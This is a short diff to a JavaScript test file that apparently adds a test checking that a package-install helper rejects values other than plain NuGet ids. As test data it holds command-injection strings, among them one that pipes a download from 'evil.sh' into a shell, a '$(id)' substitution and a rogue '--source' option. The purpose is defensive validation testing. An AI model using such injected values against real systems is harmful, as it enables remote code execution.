@@ -33,4 +33,10 @@ describe('module state', () => {
         expect(installLine({ package: 'BarakoCMS.Files' })).toBe('dotnet add package BarakoCMS.Files');
         expect(installLine({})).toBeNull();
     });
+
+    it('gives no install line for a package value that is not a plain NuGet id', () => {
+        expect(installLine({ package: 'X; curl evil.sh | sh' })).toBeNull();
+        expect(installLine({ package: 'X $(id)' })).toBeNull();
+        expect(installLine({ package: '--source http://evil' })).toBeNull();
+    });
 });
